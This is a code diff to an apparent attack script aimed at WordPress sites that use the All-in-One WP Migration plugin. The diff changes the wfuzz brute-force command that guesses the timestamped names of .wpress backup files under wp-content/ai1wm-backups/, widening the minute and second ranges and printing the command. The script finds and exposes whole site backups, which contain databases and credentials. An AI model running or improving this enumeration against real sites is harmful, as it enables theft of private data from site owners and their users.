@@ -66,7 +66,7 @@ if response.status_code == 200:
 		last_modified = response.headers['last-modified']
 		timestamp = datetime.strptime(last_modified,"%a, %d %b %Y %H:%M:%S %Z")
 		time_ymd = timestamp.strftime("%Y%m%d")
-		time_hms = timestamp.strftime("%H%M%S")
+		time_hms = timestamp.strftime("%H")
 		r = session.get(""+url+"", headers=headers,verify=False)
 		domain = urlparse(r.url).netloc
 		print ("Checking Wayback Urls")
@@ -77,7 +77,9 @@ if response.status_code == 200:
 		vercheck (url,headers)
 		print ("[*] Terminate WFuzz if you are not seeing 404 or 200 responses as this means error or rate limited. [*] ")
 		try:
-			os.system("wfuzz -c -z range,01-59 -z range,100-999 -X HEAD --sc 200 "+r.url+"wp-content/ai1wm-backups/"+domain+"-"+time_ymd+"-"+time_hms+"FUZZ-FUZ2Z.wpress")
+			command = ("wfuzz --oF /tmp/session --field r -c -z range,0-55 -z range,0-59 -z range,100-999 -X HEAD --sc 200 "+r.url+"wp-content/ai1wm-backups/"+domain+"-"+time_ymd+"-"+time_hms+"FUZZFUZ2Z-FUZ3Z.wpress")
+			print ("[*] Wfuzz using the following command: "+command+" [*]")
+			os.system(command)
 		except KeyboardInterrupt:
 			print ("Ctrl-c pressed ...")
 			sys.exit(1)
